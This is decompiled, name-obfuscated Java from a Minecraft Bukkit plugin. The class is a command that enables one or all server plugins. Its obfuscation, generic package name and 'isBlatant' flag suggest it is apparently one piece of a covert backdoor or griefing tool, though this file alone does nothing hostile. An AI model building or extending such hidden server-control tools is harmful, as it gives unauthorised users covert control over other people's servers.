/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class EnableCommand
extends Command {
    public EnableCommand() {
        EnableCommand lllllllllllllllIlIIIlIllIlIllIlI;
    }

    @Override
    public void execute(Core lllllllllllllllIlIIIlIllIlIlIIII, String lllllllllllllllIlIIIlIllIlIIllll, String[] lllllllllllllllIlIIIlIllIlIIlllI, Player lllllllllllllllIlIIIlIllIlIIlIll) {
        if (lllllllllllllllIlIIIlIllIlIIlllI.length <= 1) {
            lllllllllllllllIlIIIlIllIlIIlIll.sendMessage(Settings.USAGE("enable <plugin>"));
        } else if (lllllllllllllllIlIIIlIllIlIIlllI[1].equals("*")) {
            for (Plugin lllllllllllllllIlIIIlIllIlIlIIlI : Bukkit.getServer().getPluginManager().getPlugins()) {
                API.enablePlugin(lllllllllllllllIlIIIlIllIlIlIIlI.getName());
            }
            lllllllllllllllIlIIIlIllIlIIlIll.sendMessage(Settings.PREFIX("You enabled all of the plugins on the server!"));
        } else if (Bukkit.getPluginManager().getPlugin(lllllllllllllllIlIIIlIllIlIIlllI[1]) == null) {
            lllllllllllllllIlIIIlIllIlIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllllllllllllllIlIIIlIllIlIIlllI[1]).append(" doesn't exist. (Cap Sensitive)"))));
        } else if (!Bukkit.getPluginManager().getPlugin(lllllllllllllllIlIIIlIllIlIIlllI[1]).isEnabled()) {
            API.enablePlugin(lllllllllllllllIlIIIlIllIlIIlllI[1]);
            lllllllllllllllIlIIIlIllIlIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(Settings.RED).append(lllllllllllllllIlIIIlIllIlIIlllI[1]).append(Settings.WHITE).append(" is now enabled!"))));
        } else {
            lllllllllllllllIlIIIlIllIlIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllllllllllllllIlIIIlIllIlIIlllI[1]).append(" is already enabled!"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

